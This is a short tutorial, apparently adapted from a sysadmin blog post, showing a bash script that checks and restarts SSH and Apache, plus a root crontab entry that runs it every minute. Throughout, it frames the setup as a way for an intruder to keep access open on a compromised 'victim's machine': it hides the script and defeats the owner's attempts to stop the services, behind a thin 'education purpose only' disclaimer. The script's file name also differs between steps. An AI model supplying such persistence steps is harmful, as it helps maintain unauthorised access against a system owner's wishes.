# Bash Script to Restart Linux Server Services
#### (Use it for Education Purpose Only, and I will not be responsible for your illegal activities!)

If you manage to gain access to a victim's machine, and you want to keep servers like SSH and HTTP to stay active, the victim decides to stop it from running on the machine. Sometimes the reason can be unknown because the machine crash from time to time.

For this to work, you will need to create a file and save it to where you don't want the victim to notice it. After we created the script, then create crontab to run the script every second or minute.

No more talk, let's get to work. I will use nano to write a file, and you can also use vim editor if you are comfortable with it.

```
sudo nano /opt/launch-crashed-services.sh
```

Copy and paste this bash script on the file
```
#!/bin/bash

service ssh status | grep 'active (running)' > /dev/null 2>&1

if [ $? != 0 ]
then
        sudo service ssh restart > /dev/null
fi

service apache2 status | grep 'active (running)' > /dev/null 2>&1

if [ $? != 0 ]
then
        sudo service apache2 restart > /dev/null
fi
```
Save the file to ``` /opt/launched-crashed-services.sh ```

Then use chmod to give the file permission to run on the command line
```
sudo chmod +x /opt/launch-crashed-services.sh
```

## Scheduling Service Restarts Using Crontab
- You might be disappointed to know that the victim has discovered your activities inside their machine, and they decide to stop all the server services to run on the machine.
- Let crontab do the task by scheduling every minute to run the bash script file we created before.

Edit your root crontab list using:
```
sudo crontab -e
```

Add the following line to the bottom of the root crontab list:
```
*/1 * * * * /opt/launch-crashed-services.sh
```

##### Now if the victim attempt to stop all the server service or service crashes, then the service will attempt to restart every one-minute 

Source: https://zeropointdevelopment.com/how-to-use-a-bash-script-to-restart-linux-server-services/

